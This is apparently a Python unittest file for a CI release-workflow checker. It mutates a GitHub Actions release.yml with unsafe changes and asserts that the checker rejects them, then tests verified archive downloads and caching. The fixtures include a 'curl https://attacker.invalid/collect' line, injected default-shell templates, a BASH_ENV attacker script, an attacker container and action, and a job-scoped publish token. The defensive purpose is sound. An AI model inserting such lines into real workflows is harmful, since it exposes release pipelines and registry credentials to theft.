    def test_release_repository_code_jobs_reject_write_all_permissions(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "  prepare-publish:\n    name: Prepare the verified crates.io request\n"
            "    needs: [preflight, release-coverage]\n"
            "    runs-on: ubuntu-24.04\n    timeout-minutes: 45\n"
            "    permissions:\n      contents: read\n",
            "  prepare-publish:\n    name: Prepare the verified crates.io request\n"
            "    needs: [preflight, release-coverage]\n"
            "    runs-on: ubuntu-24.04\n    timeout-minutes: 45\n"
            "    permissions: write-all\n",
            1,
        )

        self.assertIn(
            "prepare-publish must use its reviewed least-privilege permissions",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_oidc_jobs_reject_runner_and_shell_overrides(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "env:\n  CARGO_TERM_COLOR: always\n",
            "defaults:\n  run:\n    shell: 'bash -c \"echo injected; bash {0}'\n"
            "\nenv:\n  CARGO_TERM_COLOR: always\n",
            1,
        )
        unsafe = unsafe.replace(
            "  publish:\n    name: Publish the verified archive to crates.io\n"
            "    needs:",
            "  publish:\n    name: Publish the verified archive to crates.io\n"
            "    container: attacker.invalid/runner:latest\n    needs:",
            1,
        )

        violations = check_workflows.release_oidc_isolation_violations(unsafe)
        self.assertIn(
            "release workflow must not override default shell execution", violations
        )
        self.assertIn(
            "publish must not override its runner, shell, or environment", violations
        )

    def test_workflow_shell_defaults_reject_alternate_yaml_keys(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        shell_default = (
            "  run:\n"
            "    shell: 'bash -c \"echo injected; bash {0}'\n"
        )
        mutations = [
            (
                "explicit defaults key",
                "? defaults\n:\n" + shell_default + "\nenv:\n",
            ),
            (
                "tagged defaults key",
                "!!str defaults:\n" + shell_default + "\nenv:\n",
            ),
            (
                "quoted defaults key",
                "\"defaults\":\n" + shell_default + "\nenv:\n",
            ),
        ]

        for case, replacement in mutations:
            with self.subTest(case=case):
                unsafe = workflow.replace(
                    "env:\n  CARGO_TERM_COLOR: always\n",
                    replacement + "  CARGO_TERM_COLOR: always\n",
                    1,
                )
                self.assertNotEqual(unsafe, workflow)
                self.assertIn(
                    "release workflow must not override default shell execution",
                    check_workflows.release_oidc_isolation_violations(unsafe),
                )

    def test_release_workflow_environment_rejects_shell_startup_hooks(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            '  COVERAGE_TOOLCHAIN: "nightly-2026-07-16"\n',
            '  COVERAGE_TOOLCHAIN: "nightly-2026-07-16"\n'
            "  BASH_ENV: scripts/attacker.sh\n",
            1,
        )

        self.assertIn(
            "release workflow environment must not add execution hooks",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_github_release_requires_verified_registry_bytes(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "    needs: verify-registry\n",
            "    needs: publish\n",
            1,
        )

        self.assertIn(
            "github-release must follow registry byte verification",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_oidc_steps_reject_custom_shell_templates(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        prefix, publisher = workflow.split("  publish:", 1)
        before_tag, tag_step = publisher.split(
            "name: Verify the remote annotated tag still names this commit", 1
        )
        tag_step = tag_step.replace(
            "        shell: bash\n",
            "        shell: 'bash -c \"echo injected; bash {0}'\n",
            1,
        )
        unsafe = prefix + "  publish:" + before_tag + (
            "name: Verify the remote annotated tag still names this commit" + tag_step
        )

        self.assertIn(
            "publish must use only the reviewed step shells",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_publisher_rejects_extra_command_in_tag_check(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        safe_command = (
            '          echo "verified annotated tag ${GITHUB_REF_NAME} at ${tag_commit}"\n'
        )
        unsafe = workflow.replace(
            safe_command,
            safe_command + "          curl https://attacker.invalid/collect\n",
            1,
        )

        self.assertIn(
            "publish shell steps must match the reviewed static command set",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_github_release_rejects_unreviewed_attestation_action(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "uses: actions/attest@",
            "uses: attacker/attest@",
            1,
        )

        self.assertIn(
            "github-release may use only the reviewed artifact and attestation action revisions",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_package_preparation_cannot_receive_oidc_permission(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "  prepare-publish:\n    name:",
            "  prepare-publish:\n    permissions:\n      id-token: write\n    name:",
            1,
        )

        self.assertIn(
            "prepare-publish must not have OIDC token permission",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_publisher_cannot_checkout_or_run_cargo(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "      - name: Verify publish request checksum\n",
            "      - uses: actions/checkout@1234567890abcdef1234567890abcdef12345678\n"
            "      - name: Build after OIDC permission is granted\n"
            "        run: cargo package --locked\n"
            "      - name: Verify publish request checksum\n",
            1,
        )

        violations = check_workflows.release_oidc_isolation_violations(unsafe)
        self.assertIn(
            "publish must not check out or execute repository source", violations
        )
        self.assertIn(
            "publish must not run Cargo or repository-controlled scripts", violations
        )

    def test_release_publisher_requires_tag_check_before_oidc(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "name: Verify the remote annotated tag still names this commit",
            "name: Omit remote annotated tag verification",
            1,
        )

        self.assertIn(
            "publish must recheck the remote annotated tag",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_crates_io_token_is_rejected_at_job_scope(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "    needs: [preflight, release-coverage, prepare-publish]\n",
            "    needs: [preflight, release-coverage, prepare-publish]\n"
            "    env:\n"
            "      CRATES_IO_PUBLISH_TOKEN: ${{ steps.crates-io-auth.outputs.token }}\n",
            1,
        )

        self.assertIn(
            "crates.io credentials must not be job-scoped",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_verification_script_cannot_run_after_attestation(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "          gh release create \"$GITHUB_REF_NAME\" \\\n",
            "          python3 scripts/verify_release_tag.py\n"
            "          gh release create \"$GITHUB_REF_NAME\" \\\n",
            1,
        )

        self.assertIn(
            "github-release must not execute repository code with OIDC permission",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_job_cannot_run_repository_code_before_attestation(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "      - name: Verify canonical registry checksum\n",
            "      - name: Verify canonical registry checksum\n"
            "        run: python3 scripts/verify_release_tag.py\n",
            1,
        )

        self.assertIn(
            "github-release must not execute repository code with OIDC permission",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_download_retries_transient_http_error_then_succeeds(self) -> None:
        url = "https://example.test/archive"
        error_body = io.BytesIO(b"temporary error response")
        unavailable = check_workflows.urllib.error.HTTPError(
            url, 503, "Service Unavailable", {}, error_body
        )
        archive = b"release archive"
        with (
            patch.object(
                check_workflows.urllib.request,
                "urlopen",
                side_effect=[unavailable, io.BytesIO(archive)],
            ) as urlopen,
            patch.object(check_workflows.time, "sleep") as sleep,
        ):
            downloaded = check_workflows.download_archive(url)

        self.assertEqual(downloaded, archive)
        self.assertEqual(urlopen.call_count, 2)
        self.assertTrue(error_body.closed)
        sleep.assert_called_once_with(check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS)

    def test_download_does_not_retry_permanent_http_error(self) -> None:
        for status, reason in ((404, "Not Found"), (501, "Not Implemented")):
            with self.subTest(status=status):
                error_body = io.BytesIO(b"permanent error response")
                error = check_workflows.urllib.error.HTTPError(
                    "https://example.test/archive", status, reason, {}, error_body
                )
                with (
                    patch.object(
                        check_workflows.urllib.request, "urlopen", side_effect=error
                    ) as urlopen,
                    patch.object(check_workflows.time, "sleep") as sleep,
                ):
                    with self.assertRaises(check_workflows.urllib.error.HTTPError):
                        check_workflows.download_archive(
                            "https://example.test/archive"
                        )

                self.assertEqual(urlopen.call_count, 1)
                self.assertTrue(error_body.closed)
                sleep.assert_not_called()

    def test_download_stops_after_the_configured_attempts(self) -> None:
        with (
            patch.object(check_workflows, "DOWNLOAD_ATTEMPTS", 2),
            patch.object(
                check_workflows.urllib.request,
                "urlopen",
                side_effect=check_workflows.urllib.error.URLError(
                    TimeoutError("temporary failure")
                ),
            ) as urlopen,
            patch.object(check_workflows.time, "sleep") as sleep,
        ):
            with self.assertRaises(check_workflows.urllib.error.URLError):
                check_workflows.download_archive("https://example.test/archive")

        self.assertEqual(urlopen.call_count, 2)
        sleep.assert_called_once_with(check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS)

    def test_checksum_mismatch_still_rejects_downloaded_archive(self) -> None:
        with patch.object(
            check_workflows.urllib.request,
            "urlopen",
            return_value=io.BytesIO(b"untrusted archive"),
        ) as urlopen:
            downloaded = check_workflows.download_archive(
                "https://example.test/archive"
            )

        with self.assertRaisesRegex(ValueError, "checksum mismatch"):
            check_workflows.binary_bytes(downloaded, "0" * 64)
        urlopen.assert_called_once()


class WorkflowArchiveCacheTests(unittest.TestCase):
    @staticmethod
    def make_archive(binary: bytes = b"verified actionlint binary") -> bytes:
        archive = io.BytesIO()
        with tarfile.open(fileobj=archive, mode="w:gz") as contents:
            member = tarfile.TarInfo("actionlint")
            member.size = len(binary)
            contents.addfile(member, io.BytesIO(binary))
        return archive.getvalue()

    def test_corrupt_cache_is_discarded_and_replaced_by_verified_download(self) -> None:
        url = "https://example.test/actionlint.tar.gz"
        downloaded = self.make_archive()
        checksum = hashlib.sha256(downloaded).hexdigest()
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "archive.tar.gz"
            archive.write_bytes(b"interrupted archive write")
            with patch.object(
                check_workflows, "download_archive", return_value=downloaded
            ) as download:
                executable = check_workflows.cached_actionlint_binary(
                    archive, url, checksum
                )

            self.assertEqual(executable, b"verified actionlint binary")
            self.assertEqual(archive.read_bytes(), downloaded)
            self.assertEqual(list(Path(directory).iterdir()), [archive])
            download.assert_called_once_with(url)

    def test_invalid_download_is_rejected_and_not_cached(self) -> None:
        url = "https://example.test/actionlint.tar.gz"
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "archive.tar.gz"
            archive.write_bytes(b"corrupt cache")
            with patch.object(
                check_workflows, "download_archive", return_value=b"untrusted archive"
            ) as download:
                with self.assertRaisesRegex(ValueError, "checksum mismatch"):
                    check_workflows.cached_actionlint_binary(archive, url, "0" * 64)

            self.assertFalse(archive.exists())
            download.assert_called_once_with(url)

    def test_archive_cache_write_uses_same_directory_atomic_replace(self) -> None:
        data = self.make_archive()
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "archive.tar.gz"
            original_replace = os.replace
            with patch.object(
                check_workflows.os, "replace", wraps=original_replace
            ) as replace:
                check_workflows.write_archive_atomically(archive, data)

            source, destination = replace.call_args.args
            self.assertEqual(Path(source).parent, archive.parent)
            self.assertEqual(Path(destination), archive)
            self.assertEqual(archive.read_bytes(), data)
            self.assertFalse(Path(source).exists())


class CoverageCliTests(unittest.TestCase):
    def test_help_formats_percentages_on_supported_python_versions(self) -> None:
        script = Path(__file__).with_name("verify_llvm_coverage.py")
        result = subprocess.run([sys.executable, str(script), "--help"],
                                capture_output=True, text=True, check=False)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--strict", result.stdout)


class ClaimLedgerTests(unittest.TestCase):
    def test_measured_hashes_bind_to_committed_inputs_not_current_files(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            def git(*args: str) -> bytes:
                return subprocess.check_output(["git", *args], cwd=root, stderr=subprocess.DEVNULL)
            git("init", "-q")
            measured = {}
            for field in ("manifest_sha256", "matrix_sha256"):
                path = root / claim_ledger.HASHED_FILES[field]
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(b"measured inputs\n")
                measured[field] = hashlib.sha256(path.read_bytes()).hexdigest()
            git("add", ".")
            git("-c", "user.name=Ledger test", "-c", "user.email=ledger@example.invalid",
                "-c", "commit.gpgsign=false", "commit", "-qm", "measured inputs")
            ledger = {"base_revision": git("rev-parse", "HEAD").decode().strip(),
                      "measured_inputs": measured}
            for field in measured:
                (root / claim_ledger.HASHED_FILES[field]).write_bytes(b"new unmeasured inputs\n")
            with patch.object(claim_ledger, "ROOT", root):
                errors = []
                claim_ledger.verify_measured_inputs(ledger, errors)
                self.assertEqual(errors, [])
                for field in measured:
                    changed = copy.deepcopy(ledger)
                    changed["measured_inputs"][field] = claim_ledger.sha256(root / claim_ledger.HASHED_FILES[field])
                    errors = []
                    claim_ledger.verify_measured_inputs(changed, errors)
                    self.assertEqual(errors, [f"measured_inputs.{field} does not match measured revision"])
                for invalid in [{}, {"base_revision": "not-a-commit"},
                                {"base_revision": ledger["base_revision"]},
                                {**ledger, "base_revision": "0" * 40}]:
                    errors = []
                    claim_ledger.verify_measured_inputs(invalid, errors)
                    self.assertTrue(errors)


if __name__ == "__main__":
    unittest.main()
